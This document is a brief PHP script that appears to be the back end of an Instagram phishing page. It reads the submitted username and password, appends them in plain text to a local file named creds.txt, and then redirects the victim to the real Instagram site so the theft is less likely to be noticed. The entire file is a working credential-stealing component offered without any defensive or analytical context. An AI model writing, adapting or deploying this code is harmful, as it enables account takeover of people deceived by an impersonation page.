<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["username"];
    $pass = $_POST["password"];
    $log = fopen("../creds.txt", "a");
    fwrite($log, "Username: $user | Password: $pass\n");
    fclose($log);
    header("Location: https://instagram.com");  // redirect to real site
    exit();
}
?>
